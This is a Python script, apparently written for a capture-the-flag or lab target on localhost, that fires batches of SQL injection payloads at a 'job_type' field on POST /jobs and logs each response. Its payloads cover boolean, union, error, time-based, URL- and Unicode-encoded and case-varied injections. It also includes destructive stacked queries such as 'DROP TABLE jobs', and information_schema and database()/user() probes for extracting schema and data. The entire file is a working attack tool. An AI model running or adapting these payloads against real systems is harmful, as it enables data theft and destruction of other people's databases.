import requests
import json
import urllib.parse

url = "http://127.0.0.1:8000/jobs"
headers = {
    "Content-Type": "application/json"
}

print("="*60)
print("SQL INJECTION TESTING - POST /jobs")
print("="*60)

# Baseline testing with normal values
print("\n[1] BASELINE TESTING")
print("-"*60)
baseline_values = ["back-end", "front-end", "private"]

for value in baseline_values:
    try:
        payload = {"job_type": value}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f"\n[+] Payload: {{\"job_type\": \"{value}\"}}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
    except Exception as e:
        print(f"    Error: {e}")

# Testing invalid values
print("\n\n[2] INVALID VALUE TESTING")
print("-"*60)
invalid_values = ["", "invalid_job", "12345", "admin'"]

for value in invalid_values:
    try:
        payload = {"job_type": value}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f"\n[+] Payload: {{\"job_type\": \"{value}\"}}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
    except Exception as e:
        print(f"    Error: {e}")

# SQL injection testing - Basic patterns
print("\n\n[3] SQL INJECTION TESTING - BASIC PATTERNS")
print("-"*60)
sqli_payloads = [
    # Standard injection patterns
    "back-end' OR '1'='1",
    "back-end' OR 1=1--",
    "back-end' OR 1=1#",
    "back-end' UNION SELECT NULL--",
    "back-end' AND SLEEP(5)--",
    
    # Error-based patterns
    "back-end'",
    "back-end''",
    'back-end"',
    "back-end`",
    "back-end\\",
    
    # Comment-based patterns
    "back-end--",
    "back-end#",
    "back-end/*test*/",
    "back-end'--",
    "back-end'#",
    
    # Union-based patterns
    "back-end' UNION SELECT 1,2,3--",
    "back-end' UNION SELECT 'flag', 'secret', 'data'--",
    "back-end' UNION SELECT NULL, NULL, NULL--",
    
    # Boolean-based patterns
    "back-end' AND 1=1--",
    "back-end' AND 1=2--",
    "back-end' OR 'a'='a",
    "back-end' OR 'a'='b",
    
    # Time-based patterns
    "back-end' OR SLEEP(1)--",
    "back-end' OR pg_sleep(1)--",
    "back-end' OR WAITFOR DELAY '0:0:1'--",
    "back-end' AND (SELECT pg_sleep(1))--"
]

for value in sqli_payloads:
    try:
        payload = {"job_type": value}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f"\n[+] Payload: {value}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
    except Exception as e:
        print(f"    Error: {e}")

# SQL injection testing - Encoded payloads (bypass attempts)
print("\n\n[4] SQL INJECTION TESTING - ENCODED PAYLOADS")
print("-"*60)
encoded_payloads = [
    # URL encoded versions
    urllib.parse.quote("back-end' OR '1'='1"),
    urllib.parse.quote("back-end' UNION SELECT NULL--"),
    urllib.parse.quote("back-end' OR SLEEP(5)--"),
    
    # Double URL encoded versions
    urllib.parse.quote(urllib.parse.quote("back-end' OR '1'='1")),
    
    # Unicode variations
    "back-end%u0027%20OR%20%u00271%u0027=%u00271",
    "back-end%E2%80%99%20OR%20%E2%80%981%E2%80%99=%E2%80%981"
]

for value in encoded_payloads:
    try:
        # For URL encoded payloads, keep them as-is
        payload = {"job_type": value}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f"\n[+] Encoded Payload: {value}")
        print(f"    Original: {urllib.parse.unquote(value)}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
    except Exception as e:
        print(f"    Error: {e}")

# SQL injection testing - Advanced patterns
print("\n\n[5] SQL INJECTION TESTING - ADVANCED PATTERNS")
print("-"*60)
advanced_payloads = [
    # Stacked queries
    "back-end'; DROP TABLE jobs;--",
    "back-end'; INSERT INTO jobs VALUES('flag');--",
    "back-end'; UPDATE jobs SET job_type='flag';--",
    
    # Information schema queries
    "back-end' UNION SELECT table_name FROM information_schema.tables--",
    "back-end' UNION SELECT column_name FROM information_schema.columns WHERE table_name='jobs'--",
    "back-end' UNION SELECT version()--",
    "back-end' UNION SELECT database()--",
    "back-end' UNION SELECT user()--",
    
    # Subquery patterns
    "back-end' AND (SELECT COUNT(*) FROM jobs) > 0--",
    "back-end' AND (SELECT COUNT(*) FROM jobs) = 0--",
    
    # Blind injection helpers
    "back-end' OR ASCII(SUBSTR((SELECT database()),1,1))>64--",
    "back-end' OR LENGTH(database())>5--",
    
    # Mixed case variations (bypass case-sensitive filters)
    "back-end' OR '1'='1",
    "back-end' Or '1'='1",
    "back-end' oR '1'='1",
    "bAcK-eNd' Or '1'='1"
]

for value in advanced_payloads:
    try:
        payload = {"job_type": value}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f"\n[+] Payload: {value}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
    except Exception as e:
        print(f"    Error: {e}")

print("\n" + "="*60)
print("TESTING COMPLETE")
print("="*60)
